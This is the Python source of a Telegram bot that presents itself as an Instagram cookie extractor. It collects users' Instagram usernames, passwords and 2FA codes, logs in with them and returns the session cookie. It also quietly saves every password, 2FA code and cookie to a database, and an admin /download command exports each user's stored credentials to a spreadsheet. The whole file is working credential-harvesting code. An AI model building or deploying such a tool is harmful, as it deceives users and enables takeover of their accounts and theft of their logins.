import os
import sqlite3
from datetime import datetime
from io import BytesIO

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ConversationHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
from openpyxl import Workbook
from instagrapi import Client
from instagrapi.exceptions import LoginRequired, TwoFactorRequired

# ---------- Environment Variables ----------
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_CHAT_ID = int(os.getenv("ADMIN_CHAT_ID", "0"))

# Conversation states
USERNAME, PASSWORD, TFA = range(3)

# ---------- Database Setup ----------
conn = sqlite3.connect("data.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute("""
    CREATE TABLE IF NOT EXISTS credentials (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        tg_user_id INTEGER,
        instagram_username TEXT,
        instagram_password TEXT,
        tfa_key TEXT,
        cookie TEXT,
        timestamp TEXT
    )
""")
conn.commit()

def save_credentials(tg_user_id, username, password, tfa, cookie):
    timestamp = datetime.now().isoformat()
    cursor.execute(
        "INSERT INTO credentials (tg_user_id, instagram_username, instagram_password, tfa_key, cookie, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
        (tg_user_id, username, password, tfa, cookie, timestamp),
    )
    conn.commit()

def get_user_credentials(tg_user_id):
    cursor.execute(
        "SELECT instagram_username, instagram_password, tfa_key, timestamp, cookie FROM credentials WHERE tg_user_id = ? ORDER BY id",
        (tg_user_id,),
    )
    return cursor.fetchall()

# ---------- Real Instagram Login using instagrapi ----------
def instagram_login(username, password, tfa_code=None):
    """
    Logs into Instagram using instagrapi.
    Returns (success, cookie_string_or_error_message)
    """
    cl = Client()
    try:
        # Try login without 2FA first
        cl.login(username, password)
    except TwoFactorRequired:
        if not tfa_code:
            return False, "2FA required but no code provided. Please send the 2FA code (or 0 if none)."
        try:
            # Login with 2FA verification code
            cl.login(username, password, verification_code=tfa_code)
        except Exception as e:
            return False, f"2FA login failed: {str(e)}"
    except LoginRequired as e:
        return False, f"Login failed (wrong username/password?): {str(e)}"
    except Exception as e:
        return False, f"Unexpected error: {str(e)}"

    # Extract cookies from instagrapi session
    cookie_jar = cl.get_cookies()
    cookie_dict = cookie_jar.get_dict()
    cookie_string = "; ".join([f"{k}={v}" for k, v in cookie_dict.items()])
    return True, cookie_string

# ---------- Telegram Handlers ----------
async def send_welcome_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("🍪 extract Cookie", callback_data="extract_cookie")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "Welcome! Click the button below to extract your **real Instagram cookie**.\n\n"
        "You will be asked for:\n"
        "1️⃣ Instagram username\n"
        "2️⃣ Instagram password\n"
        "3️⃣ 2FA code (if enabled) – type 0 if you don't have 2FA",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def start_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("Please send your Instagram username:")
    return USERNAME

async def get_username(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["ig_username"] = update.message.text.strip()
    await update.message.reply_text("Now send your Instagram password:")
    return PASSWORD

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["ig_password"] = update.message.text.strip()
    await update.message.reply_text(
        "Finally, send your 2FA code.\n"
        "If you don't have 2FA enabled, type `0` (zero).",
        parse_mode="Markdown"
    )
    return TFA

async def get_tfa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    tfa_raw = update.message.text.strip()
    tfa_code = None if tfa_raw == "0" else tfa_raw

    username = context.user_data["ig_username"]
    password = context.user_data["ig_password"]
    tg_user_id = update.effective_user.id

    await update.message.reply_text("⏳ Logging into Instagram, please wait...")

    success, result = instagram_login(username, password, tfa_code)

    if not success:
        await update.message.reply_text(f"❌ Login failed:\n{result}\nPlease try again with /start")
        context.user_data.clear()
        return ConversationHandler.END

    cookie_string = result

    # Save to database
    save_credentials(tg_user_id, username, password, (tfa_code or "None"), cookie_string)

    # Send the real cookie as a message
    await update.message.reply_text(
        f"✅ Login successful! Here is your Instagram cookie:\n\n`{cookie_string}`\n\n"
        "⚠️ Keep this cookie secret – anyone with it can access your account.",
        parse_mode="Markdown"
    )

    # Clear conversation data and send welcome message again
    context.user_data.clear()
    await send_welcome_message(update, context)
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Operation cancelled. Use /start to begin again.")
    context.user_data.clear()
    return ConversationHandler.END

# ---------- Admin Command: /download <user_id> ----------
async def download_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        await update.message.reply_text("⛔ Unauthorized. Only admin can use this command.")
        return

    if not context.args or len(context.args) != 1:
        await update.message.reply_text("Usage: /download <telegram_user_id>")
        return

    try:
        target_user_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("User ID must be an integer.")
        return

    rows = get_user_credentials(target_user_id)
    if not rows:
        await update.message.reply_text(f"No data found for user ID {target_user_id}.")
        return

    # Create Excel file in memory
    wb = Workbook()
    ws = wb.active
    ws.title = "Instagram Credentials"
    ws.append(["Instagram Username", "Password", "2FA Key", "Timestamp", "Cookie"])

    for row in rows:
        ws.append(list(row))

    excel_buffer = BytesIO()
    wb.save(excel_buffer)
    excel_buffer.seek(0)

    await update.message.reply_document(
        document=excel_buffer,
        filename=f"user_{target_user_id}_insta_data.xlsx",
        caption=f"All credentials submitted by user {target_user_id} (including cookies)",
    )

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await send_welcome_message(update, context)

# ---------- Main ----------
def main():
    if not BOT_TOKEN:
        raise ValueError("BOT_TOKEN environment variable not set.")
    if ADMIN_CHAT_ID == 0:
        print("⚠️ Warning: ADMIN_CHAT_ID not set. Admin commands will be disabled.")

    app = Application.builder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(start_extract, pattern="^extract_cookie$")],
        states={
            USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_username)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
            TFA: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_tfa)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        per_message=True,  # Fixes the PTBUserWarning
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(conv_handler)
    app.add_handler(CommandHandler("download", download_command))

    print("Bot is running with instagrapi (real Instagram login)...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
